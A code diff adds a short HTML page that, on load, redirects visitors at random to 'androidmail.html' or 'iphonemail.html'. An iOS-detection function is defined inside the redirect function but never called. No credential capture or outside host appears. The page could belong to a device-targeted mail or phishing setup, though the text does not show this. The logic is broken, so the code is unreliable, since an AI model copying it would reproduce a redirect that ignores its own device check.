@@ -1,0 +1,38 @@
+<html>
+ <meta name="viewport" content="width=device-width, initial-scale=1">
+    <body>
+    <script>
+
+          var sites = [
+
+'androidmail.html','iphonemail.html'
+
+];
+
+
+            function randomSite() {
+                var i = parseInt(Math.random() * sites.length);
+                location.href = sites[i];
+
+
+
+                function gfg_Run() {
+                  var iOS =
+                    /iPad|iPhone|iPod/.test(navigator.userAgent) &&
+                    !window.MSStream;
+
+                    if (iOS) {
+                                      location.href = sites[1];;
+                                    } else {
+                                      location.href = sites[0];
+                                    }
+                }
+
+            }
+
+
+        <!--<body onload='randomSite()'>-->
+    </script>
+    <body onload='randomSite()'>
+</body>
+</html>
